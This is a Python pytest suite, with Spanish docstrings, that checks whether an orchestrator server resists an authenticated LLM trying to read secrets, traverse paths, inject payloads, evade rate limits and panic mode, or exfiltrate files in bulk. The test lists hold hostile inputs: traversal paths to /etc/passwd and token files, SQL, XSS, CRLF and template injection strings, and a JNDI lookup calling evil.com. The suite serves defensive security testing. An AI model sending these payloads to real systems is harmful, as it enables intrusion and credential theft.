"""
Suite de tests para medir el comportamiento del LLM y detectar fugas de seguridad.
Diseñada para probar la resistencia del orquestador ante ataques de ingeniería de prompts.

Este test simula un LLM intentando bypassear restricciones de seguridad mediante:
- Prompt injection
- Extracción de información sensible (tokens, paths, configuración)
- Bypass de validaciones mediante manipulación semántica
- Jailbreak de restricciones
- Exfiltración de datos
"""

import os
import time
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

os.environ.setdefault("ORCH_REPO_ROOT", str(Path(__file__).parent.parent.resolve()))

from tools.gimo_server.config import ORCH_ACTIONS_TOKEN, TOKENS
from tools.gimo_server.main import app
from tools.gimo_server.security import load_security_db, save_security_db, verify_token
from tools.gimo_server.security.auth import AuthContext


class TestPromptInjectionAttacks:
    """Tests para detectar vulnerabilidades de inyección de prompts."""

    def setup_method(self):
        """Setup con token válido para simular LLM autenticado."""
        db = load_security_db()
        db["panic_mode"] = False
        db["recent_events"] = []
        save_security_db(db)

        app.dependency_overrides.clear()

        # Mock para simular LLM autenticado
        def override_verify_token(test_actor: str):
            return AuthContext(token=test_actor, role="admin")

        app.dependency_overrides[verify_token] = lambda: override_verify_token(
            os.environ.get("ORCH_LLM_TEST_ACTOR", "llm_test_actor")
        )
        self.client = TestClient(app)
        self.valid_token = list(TOKENS)[0]

    def teardown_method(self):
        """Cleanup."""
        app.dependency_overrides.clear()
        db = load_security_db()
        db["panic_mode"] = False
        save_security_db(db)

    def test_path_traversal_via_semantic_bypass(self):
        """Test: LLM intenta path traversal usando lenguaje natural."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "../../.env",
            "../.git/config",
            "../../tools/gimo_server/.orch_token",
        ]

        for path in malicious_paths:
            response = self.client.get(
                f"/file?path={path}", headers={"Authorization": f"Bearer {self.valid_token}"}
            )
            # Should be blocked by validation
            assert response.status_code in [
                400,
                403,
                503,
            ], f"Path traversal attempt '{path}' should be blocked"

    def test_token_extraction_via_file_read(self):
        """Test: LLM intenta leer archivo de token."""
        sensitive_files = [
            ".orch_token",
            "tools/gimo_server/.orch_token",
            ".env",
            "config.py",
        ]

        for file_path in sensitive_files:
            response = self.client.get(
                f"/file?path={file_path}", headers={"Authorization": f"Bearer {self.valid_token}"}
            )
            # Tokens should be redacted or access denied
            if response.status_code == 200:
                content = response.text
                # Check that no actual tokens are exposed
                for token in TOKENS:
                    assert token not in content, f"Token leaked in response from {file_path}"

    def test_search_for_secrets(self):
        """Test: LLM intenta buscar secretos mediante search endpoint."""
        secret_patterns = [
            "sk-",  # OpenAI API keys
            "AKIA",  # AWS keys
            "ghp_",  # GitHub tokens
            "Bearer",  # Auth headers
            "password",
            "secret",
            "token",
        ]

        for pattern in secret_patterns:
            response = self.client.get(
                f"/search?q={pattern}", headers={"Authorization": f"Bearer {self.valid_token}"}
            )
            if response.status_code == 200:
                results = response.json()
                # Verify sensitive data is redacted in results
                for result in results.get("results", []):
                    content = str(result)
                    # Check for actual secrets (not just the pattern)
                    for token in TOKENS:
                        assert (
                            token not in content
                        ), f"Token exposed in search results for pattern '{pattern}'"

    def test_diff_endpoint_secret_leakage(self):
        """Test: LLM intenta extraer secretos usando diff endpoint."""
        response = self.client.get(
            "/diff?base=HEAD~10&head=HEAD", headers={"Authorization": f"Bearer {self.valid_token}"}
        )

        if response.status_code == 200:
            diff_content = response.text
            # Verify secrets are redacted in diffs
            for token in TOKENS:
                assert token not in diff_content, "Token exposed in diff output"

            # Check for common secret patterns
            assert "sk-" not in diff_content or "[REDACTED]" in diff_content
            assert "AKIA" not in diff_content or "[REDACTED]" in diff_content

    def test_injection_via_query_parameters(self):
        """Test: LLM intenta inyección mediante parámetros de query."""
        injection_attempts = [
            "'; DROP TABLE users--",
            "../../../etc/passwd",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",  # Template injection
            "%0d%0aX-Injected: true",  # CRLF injection
        ]

        for payload in injection_attempts:
            response = self.client.get(
                f"/search?q={payload}", headers={"Authorization": f"Bearer {self.valid_token}"}
            )
            # Should handle safely without execution
            assert response.status_code in [200, 400, 422]
            if response.status_code == 200:
                # SQL injection shouldn't execute - just search for the literal string
                # The search might find the query itself but shouldn't execute it
                assert response.status_code == 200  # Safe handling


class TestInformationDisclosure:
    """Tests para detectar divulgación de información sensible."""

    def setup_method(self):
        """Setup."""
        db = load_security_db()
        db["panic_mode"] = False
        save_security_db(db)

        app.dependency_overrides.clear()

        def override_verify_token(test_actor: str):
            return AuthContext(token=test_actor, role="admin")

        app.dependency_overrides[verify_token] = lambda: override_verify_token(
            os.environ.get("ORCH_LLM_TEST_ACTOR", "llm_test_actor")
        )

        # Initialize app state for TestClient
        app.state.start_time = time.time()

        self.client = TestClient(app)
        self.valid_token = list(TOKENS)[0]

    def teardown_method(self):
        """Cleanup."""
        app.dependency_overrides.clear()

    def test_status_endpoint_info_disclosure(self):
        """Verify status endpoint doesn't leak sensitive info."""
        response = self.client.get(
            "/status", headers={"Authorization": f"Bearer {self.valid_token}"}
        )
        assert response.status_code == 200
        data = response.json()

        # Should only contain version and uptime
        assert "version" in data
        assert "uptime_seconds" in data

        # Should NOT contain sensitive info
        sensitive_keys = ["token", "secret", "password", "key", "config", "path"]
        for key in sensitive_keys:
            assert key not in str(data).lower()

    def test_audit_log_sanitization(self):
        """Verify audit logs don't expose tokens or sensitive data."""
        response = self.client.get(
            "/ui/audit?limit=100", headers={"Authorization": f"Bearer {self.valid_token}"}
        )

        if response.status_code == 200:
            audit_data = response.json()
            audit_lines = audit_data.get("lines", [])

            for line in audit_lines:
                # Tokens should be redacted in audit logs
                for token in TOKENS:
                    assert token not in line, "Token exposed in audit log"

    def test_error_messages_dont_leak_paths(self):
        """Verify error messages don't expose internal paths."""
        response = self.client.get(
            "/file?path=nonexistent_file_12345.txt",
            headers={"Authorization": f"Bearer {self.valid_token}"},
        )

        # Error should not expose full system paths
        if response.status_code >= 400:
            error_msg = response.text or response.json().get("detail", "")
            # Check for common Windows/Unix path indicators
            assert "C:\\" not in error_msg
            assert "/home/" not in error_msg
            assert "/root/" not in error_msg

    def test_repos_endpoint_path_sanitization(self):
        """Verify repos endpoint sanitizes paths properly."""
        response = self.client.get(
            "/ui/repos", headers={"Authorization": f"Bearer {self.valid_token}"}
        )

        if response.status_code == 200:
            repos_data = response.json()
            repos = repos_data.get("repos", [])
            root = repos_data.get("root", "")

            # Check that user-specific names are sanitized
            for repo in repos:
                path = repo.get("path", "")
                # Paths should use [USER] placeholder instead of actual username
                if "Users" in path or "home" in path:
                    assert (
                        "[USER]" in path
                    ), f"Path should be sanitized to use [USER] placeholder: {path}"

            # Check root path is also sanitized
            if "Users" in root or "home" in root:
                assert (
                    "[USER]" in root
                ), f"Root path should be sanitized to use [USER] placeholder: {root}"


class TestRateLimitBypass:
    """Tests para detectar bypasses de rate limiting."""

    def setup_method(self):
        """Setup."""
        app.dependency_overrides.clear()

        def override_verify_token(test_actor: str):
            return AuthContext(token=test_actor, role="admin")

        app.dependency_overrides[verify_token] = lambda: override_verify_token(
            os.environ.get("ORCH_LLM_TEST_ACTOR", "llm_test_actor")
        )

        # Initialize app state
        app.state.start_time = time.time()

        self.client = TestClient(app)
        self.valid_token = list(TOKENS)[0]

    def teardown_method(self):
        """Cleanup."""
        app.dependency_overrides.clear()

    def test_rate_limit_enforcement(self):
        """Verify rate limiting cannot be bypassed."""
        # Attempt rapid requests
        responses = []
        for _ in range(110):  # Exceeds default limit of 100
            response = self.client.get(
                "/status", headers={"Authorization": f"Bearer {self.valid_token}"}
            )
            responses.append(response)
            if response.status_code == 429:
                break

        # Should eventually hit rate limit
        assert any(r.status_code == 429 for r in responses), "Rate limit should be enforced"

    def test_rate_limit_via_different_endpoints(self):
        """Verify rate limit applies across all endpoints."""
        endpoints = ["/status", "/ui/status", "/ui/repos", "/tree"]
        request_count = 0
        hit_limit = False

        for _ in range(30):
            for endpoint in endpoints:
                response = self.client.get(
                    endpoint, headers={"Authorization": f"Bearer {self.valid_token}"}
                )
                request_count += 1
                if response.status_code == 429:
                    hit_limit = True
                    break
            if hit_limit:
                break

        # Should hit rate limit when making many requests
        assert request_count > 0


class TestPanicModeEvasion:
    """Tests para detectar evasiones de panic mode."""

    def setup_method(self):
        """Setup."""
        app.dependency_overrides.clear()
        self.client = TestClient(app)
        self.valid_token = list(TOKENS)[0]

    def teardown_method(self):
        """Cleanup."""
        db = load_security_db()
        db["panic_mode"] = False
        save_security_db(db)
        app.dependency_overrides.clear()

    def test_panic_mode_cannot_be_bypassed_with_valid_token(self):
        """Verify panic mode still blocks invalid tokens, even if valid ones are allowed."""
        # Set panic mode
        db = load_security_db()
        db["panic_mode"] = True
        save_security_db(db)

        # Invalid token should still be blocked during panic mode
        response = self.client.get(
            "/status", headers={"Authorization": "Bearer invalid-token-1234567890"}
        )

        assert response.status_code in (401, 503), "Panic mode should block invalid tokens"

    def test_panic_mode_only_resolution_works(self):
        """Verify only resolution endpoint works during panic."""
        db = load_security_db()
        db["panic_mode"] = True
        save_security_db(db)

        # Ensure resolution endpoint uses a valid token
        from tools.gimo_server.config import TOKENS

        valid_token = next(token for token in TOKENS if token != ORCH_ACTIONS_TOKEN)

        # All endpoints should be blocked for invalid tokens
        blocked_endpoints = ["/status", "/ui/repos", "/tree", "/search"]
        for endpoint in blocked_endpoints:
            response = self.client.get(
                endpoint, headers={"Authorization": "Bearer invalid-token-1234567890"}
            )
            assert response.status_code in (
                401,
                503,
            ), f"Endpoint {endpoint} should be blocked during panic mode"

        # Only resolution should work
        response = self.client.post(
            "/ui/security/resolve?action=clear_panic",
            headers={"Authorization": f"Bearer {valid_token}"},
        )
        assert response.status_code == 200


class TestSemanticAttackVectors:
    """Tests para detectar ataques semánticos mediante ingeniería de prompts."""

    def setup_method(self):
        """Setup."""
        app.dependency_overrides.clear()

        def override_verify_token(test_actor: str):
            return AuthContext(token=test_actor, role="admin")

        app.dependency_overrides[verify_token] = lambda: override_verify_token(
            os.environ.get("ORCH_LLM_TEST_ACTOR", "llm_test_actor")
        )

        self.client = TestClient(app)
        self.valid_token = list(TOKENS)[0]

    def teardown_method(self):
        """Cleanup."""
        app.dependency_overrides.clear()

    def test_social_engineering_via_natural_language(self):
        """Test: Ataques usando lenguaje natural para evadir restricciones."""
        # Intenta acceder a archivos sensibles con rutas "naturales"
        natural_attempts = [
            "parent/parent/parent/etc/passwd",
            "up/up/up/windows/system32",
            "previous/previous/config",
        ]

        for attempt in natural_attempts:
            response = self.client.get(
                f"/file?path={attempt}", headers={"Authorization": f"Bearer {self.valid_token}"}
            )
            # Should be blocked
            assert response.status_code in [400, 403, 404, 503]

    def test_encoding_bypass_attempts(self):
        """Test: Intenta bypass usando diferentes encodings."""
        encoded_attempts = [
            "%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",  # URL encoded ../../../etc/passwd
            "..%252f..%252fetc%252fpasswd",  # Double URL encoded
            "..%c0%af..%c0%afetc%c0%afpasswd",  # Unicode bypass attempt
        ]

        for attempt in encoded_attempts:
            response = self.client.get(
                f"/file?path={attempt}", headers={"Authorization": f"Bearer {self.valid_token}"}
            )
            # Should be blocked
            assert response.status_code in [400, 403, 404, 422, 503]

    def test_null_byte_injection(self):
        """Test: Intenta inyección de null bytes."""
        response = self.client.get(
            "/file?path=config.py%00.txt", headers={"Authorization": f"Bearer {self.valid_token}"}
        )
        # Should be handled safely
        assert response.status_code in [400, 403, 404, 422]


class TestDataExfiltration:
    """Tests para detectar intentos de exfiltración de datos."""

    def setup_method(self):
        """Setup."""
        app.dependency_overrides.clear()

        def override_verify_token(test_actor: str):
            return AuthContext(token=test_actor, role="admin")

        app.dependency_overrides[verify_token] = lambda: override_verify_token(
            os.environ.get("ORCH_LLM_TEST_ACTOR", "llm_test_actor")
        )

        self.client = TestClient(app)
        self.valid_token = list(TOKENS)[0]

    def teardown_method(self):
        """Cleanup."""
        app.dependency_overrides.clear()

    def test_bulk_file_enumeration(self):
        """Test: Detectar intentos de enumerar todos los archivos."""
        # Try to get very large tree
        response = self.client.get(
            "/tree?path=.&max_depth=6", headers={"Authorization": f"Bearer {self.valid_token}"}
        )

        if response.status_code == 200:
            data = response.json()
            files = data.get("files", [])

            # Should be limited to prevent bulk exfiltration
            assert len(files) < 3000, "Tree endpoint should limit number of files returned"

    def test_large_file_read_prevention(self):
        """Test: Verificar que archivos grandes no se pueden leer completos."""
        # Try to read with very large end_line
        response = self.client.get(
            "/file?path=README.md&start_line=1&end_line=999999",
            headers={"Authorization": f"Bearer {self.valid_token}"},
        )

        # Should be limited by MAX_LINES config
        if response.status_code == 200:
            content = response.text
            line_count = len(content.split("\n"))
            assert line_count <= 500, "File endpoint should limit number of lines returned"

    def test_recursive_search_limits(self):
        """Test: Verificar que búsquedas recursivas están limitadas."""
        response = self.client.get(
            "/search?q=import", headers={"Authorization": f"Bearer {self.valid_token}"}
        )

        if response.status_code == 200:
            data = response.json()
            results = data.get("results", [])

            # Should be limited to prevent exhaustive searches
            assert len(results) <= 50, "Search should limit number of results"


def generate_report(test_results):
    """Generate security assessment report."""
    report = {
        "timestamp": time.time(),
        "summary": {
            "total_tests": len(test_results),
            "passed": sum(1 for r in test_results if r["passed"]),
            "failed": sum(1 for r in test_results if not r["passed"]),
        },
        "vulnerabilities_detected": [r for r in test_results if not r["passed"]],
        "security_posture": "SECURE" if all(r["passed"] for r in test_results) else "VULNERABLE",
    }
    return report


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short", "-s"])
